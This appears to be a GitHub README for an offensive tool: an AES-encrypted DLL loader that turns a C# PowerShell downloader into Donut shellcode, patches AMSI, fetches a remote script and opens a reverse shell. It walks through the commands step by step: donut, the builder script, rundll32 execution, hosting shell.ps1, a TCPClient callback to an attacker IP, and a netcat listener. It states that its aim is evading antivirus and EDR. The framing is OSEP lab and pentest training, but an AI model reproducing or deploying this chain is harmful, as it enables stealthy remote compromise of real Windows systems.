# 🧬 AES-Encrypted DLL Loader – Donut + PowerShell

## 🎯 Motivation

Shellcode generated using tools like `msfvenom` is often highly detectable by modern antivirus and EDR solutions. Even with encoders, typical byte patterns and behavior can trigger alerts. To address this, this project:

- Replaces `msfvenom` with custom shellcode transformed by [Donut](https://github.com/TheWover/donut)
- Executes it via a C# loader that downloads and runs a PowerShell payload
- Provides a C++ DLL (`loader.dll`) that, when injected or called via `rundll32`, decrypts and executes shellcode in memory

This method is designed for lab environments similar to **OSEP** and has been tested with **Windows Defender enabled**.

---

## 🧩 Step 1: Build the PowerShell Loader

- The C# loader (`Loader.cs`) patches AMSI via `.NET Reflection`, downloads a remote PowerShell payload, and executes it in memory using `Runspace`.
- Uses base64 string obfuscation for script names like `shell.ps1`.

 📌 **Important:**  
 Make sure the hardcoded IP in `Loader.exe` **matches the IP of the machine hosting `shell.ps1`** via HTTP.

 📌 **Note:** You may need to reference:
 ```
 C:\Program Files\WindowsPowerShell\Modules\PowerShellGet\<version>\System.Management.Automation.dll
 ```
---

## 🧪 Step 2: Generate Shellcode with Donut

Convert the compiled `Loader.exe` into raw shellcode using [Donut](https://github.com/TheWover/donut):

```bash
donut.exe -i Loader.exe -a 2 -f 1 -b 1 -o shellcode.bin
```

**Explanation of Donut flags:**
- `-a 2`: Target architecture (x64)
- `-f 1`: Output format: raw shellcode
- `-b 1`: AMSI/WLDP/ETW bypass level  
  - `1`: **No bypass**  
  - `2`: Abort on failure  
  - `3`: Continue on failure

💡 *This project uses Donut on Windows and then transfers `shellcode.bin` to a Kali Linux host for encryption.*

---

## 🧪 Step 3: Encrypt & compile:

   # Standalone (key embedded):
   ```
   python3 AES_DLL_Builder.py --standalone shellcode.bin
   ```
   Transfer the dll file to the Windows Target and:
   ```
   rundll32 loader.dll,EPoint
   ```
   # Non-Standalone (supply key):
   ```
   python3 AES_DLL_Builder.py --non-standalone shellcode.bin
   ```
   Transfer the dll file to the Windows Target and:
   ```
   rundll32 loader.dll,EPoint "my_key_123"
   ```
---

## 🌐 Step 4: Host the PowerShell Reverse Shell

Create a `shell.ps1` PowerShell script containing your reverse shell logic.

📌 **Important:**  
Ensure that the IP inside `shell.ps1` (e.g. `TCPClient('192.168.1.X', 443)`) **matches the IP of your listener machine**.

Then serve the file using Python:

```bash
python3 -m http.server 80
```

---

## 📡 Step 5: Start Listener with Netcat

Use `netcat` (and optionally `rlwrap`) to catch the reverse shell:

```bash
rlwrap -cAr nc -lnvp 443
```

---

## ⚠️ Legal Notice

This project is for **educational and authorized penetration testing** purposes only.  
Do not use this code outside of lab environments or without **explicit permission**.  
Misuse may be illegal and unethical.

---
